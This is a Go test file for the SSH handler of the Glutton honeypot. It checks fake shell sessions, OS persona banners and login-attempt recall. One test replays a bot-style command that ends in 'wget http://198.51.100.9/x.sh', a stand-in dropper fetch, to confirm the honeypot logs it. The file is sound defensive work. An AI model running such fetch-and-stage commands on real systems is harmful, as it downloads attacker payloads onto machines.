package tcp

import (
	"io"
	"net"
	"strings"
	"testing"

	"github.com/mushorg/glutton/protocols/recall"
	sshproto "github.com/mushorg/glutton/protocols/tcp/ssh"
	"github.com/spf13/viper"
	"github.com/stretchr/testify/require"
	cryptossh "golang.org/x/crypto/ssh"
)

func startShellSSH(t *testing.T, store *recall.Store, pick int) (string, *fakeHoneypot, chan error) {
	t.Helper()
	useSSHRecall(t, store, pick)
	viper.Set("ssh.shell", true)
	t.Cleanup(func() { viper.Set("ssh.shell", nil) })
	return serveSSH(t)
}

// sshDial logs in with a password, retrying until the shell opens.
func sshDial(t *testing.T, addr, user, password string) *cryptossh.Client {
	t.Helper()
	cfg := &cryptossh.ClientConfig{
		User:            user,
		Auth:            []cryptossh.AuthMethod{cryptossh.RetryableAuthMethod(cryptossh.Password(password), 10)},
		HostKeyCallback: cryptossh.InsecureIgnoreHostKey(),
		Timeout:         sshTimeout,
	}
	client, err := cryptossh.Dial("tcp", addr, cfg)
	require.NoError(t, err)
	return client
}

func TestSSHShellExec(t *testing.T) {
	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 3)
	client := sshDial(t, addr, "root", "123456")
	require.Equal(t, "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3", string(client.ServerVersion()))
	sess, err := client.NewSession()
	require.NoError(t, err)
	out, err := sess.CombinedOutput("uname -s; cat /etc/os-release | head -1; wget http://198.51.100.9/x.sh")
	require.NoError(t, err)
	require.Contains(t, string(out), "Linux\n")
	require.Contains(t, string(out), "Debian GNU/Linux 12 (bookworm)")
	require.Contains(t, string(out), "wget: unable to resolve host address")
	client.Close()

	_, frames := waitSSHEvent(t, hp, done)
	require.Equal(t, "debian-12", frames[0].Variant)
	require.Equal(t, 1, frames[0].Visit)
	auth := sshFramesByCommand(frames, "read", "auth-password")
	require.Len(t, auth, 4, "three rejected guesses, then the login")
	require.Equal(t, "success", sshFramesByCommand(frames, "write", "auth-password")[3].Status)
	execs := sshFramesByCommand(frames, "read", "exec")
	require.Len(t, execs, 1)
	require.Equal(t, "uname -s; cat /etc/os-release | head -1; wget http://198.51.100.9/x.sh", string(execs[0].Payload))
	writes := sshFramesByCommand(frames, "write", "cmd")
	require.Len(t, writes, 1)
	require.Equal(t, "ok", writes[0].Status)
}

func TestSSHShellInteractive(t *testing.T) {
	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 0)
	client := sshDial(t, addr, "admin", "admin")
	sess, err := client.NewSession()
	require.NoError(t, err)
	require.NoError(t, sess.RequestPty("xterm", 24, 80, cryptossh.TerminalModes{}))
	stdin, err := sess.StdinPipe()
	require.NoError(t, err)
	stdout, err := sess.StdoutPipe()
	require.NoError(t, err)
	require.NoError(t, sess.Shell())

	_, err = io.WriteString(stdin, "whoami\rnope\rexit\r")
	require.NoError(t, err)
	out, err := io.ReadAll(stdout)
	require.NoError(t, err)
	require.Contains(t, string(out), "admin@ubuntu:~$ ")
	require.Contains(t, string(out), "admin\r\n")
	require.Contains(t, string(out), "bash: nope: command not found\r\n")
	client.Close()

	_, frames := waitSSHEvent(t, hp, done)
	require.Len(t, sshFramesByCommand(frames, "read", "pty-req"), 1)
	require.Len(t, sshFramesByCommand(frames, "read", "shell"), 1)
	var lines []string
	for _, f := range sshFramesByCommand(frames, "read", "cmd") {
		lines = append(lines, string(f.Payload))
	}
	require.Equal(t, []string{"whoami", "nope", "exit"}, lines)
	var statuses []string
	for _, f := range sshFramesByCommand(frames, "write", "cmd") {
		statuses = append(statuses, f.Status)
	}
	require.Equal(t, []string{"ok", "not-found", "ok"}, statuses)
}

// A bot that tries one password per connection still gets in: the attempts
// count across connections within a recall visit, and the persona stays.
func TestSSHRecallPersonaAndAttempts(t *testing.T) {
	store := recall.New(recall.DefaultConfig())
	useSSHRecall(t, store, 4)
	viper.Set("ssh.shell", true)
	t.Cleanup(func() { viper.Set("ssh.shell", nil) })

	for i := 0; i < 4; i++ {
		addr, hp, done := serveSSH(t)
		cfg := &cryptossh.ClientConfig{
			User:            "root",
			Auth:            []cryptossh.AuthMethod{cryptossh.Password("hunter2")},
			HostKeyCallback: cryptossh.InsecureIgnoreHostKey(),
			Timeout:         sshTimeout,
		}
		client, err := cryptossh.Dial("tcp", addr, cfg)
		if i < 3 {
			require.Error(t, err, "connection %d", i)
		} else {
			require.NoError(t, err)
			require.Equal(t, "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3", string(client.ServerVersion()))
			client.Close()
		}
		_, frames := waitSSHEvent(t, hp, done)
		require.Equal(t, "debian-11", frames[0].Variant, "connection %d", i)
		// the picker would now say 1, but recall remembers the first pick
		sshPick = func(int) int { return 1 }
	}
}

func TestSSHPersonaOverride(t *testing.T) {
	viper.Set("ssh.persona", "centos-7")
	t.Cleanup(func() { viper.Set("ssh.persona", nil) })
	addr, hp, done := startSSH(t)
	conn, err := net.Dial("tcp", addr)
	require.NoError(t, err)
	buf := make([]byte, 64)
	n, err := conn.Read(buf)
	require.NoError(t, err)
	require.True(t, strings.HasPrefix(string(buf[:n]), "SSH-2.0-OpenSSH_7.4\r\n"))
	conn.Close()
	_, frames := waitSSHEvent(t, hp, done)
	require.Equal(t, "centos-7", frames[0].Variant)
}

func TestSSHPersonasValid(t *testing.T) {
	seen := map[string]bool{}
	for _, p := range sshproto.Personas {
		require.False(t, seen[p.Name], p.Name)
		seen[p.Name] = true
		require.True(t, strings.HasPrefix(p.Version, "SSH-2.0-OpenSSH_"), p.Name)
		require.NotContains(t, strings.ToLower(p.Hostname+p.Version), "glutton")
	}
	require.Equal(t, sshproto.ServerVersion, sshproto.Personas[0].Version)
}
